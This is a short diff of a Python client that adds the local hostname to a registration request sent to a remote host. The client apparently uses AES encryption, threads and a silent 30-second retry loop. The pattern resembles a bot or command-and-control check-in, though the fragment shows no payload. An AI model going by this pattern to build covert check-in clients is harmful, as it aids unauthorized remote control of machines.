@@ -6,6 +6,9 @@ from multiprocessing import Process
 import base64
 import threading
 from Crypto.Cipher import AES
+import socket
+
+host_name = socket.gethostname()
 
 global th_list
 th_list = []
@@ -60,7 +63,7 @@ session = requests.Session()
 if "id" not in glob.glob("*.*"):
     while True:
         try:
-            response = session.get(f"http://{host}/get_id/",headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
+            response = session.get(f"http://{host}/get_id?name={host_name}",headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
             break
         except:
             time.sleep(30)
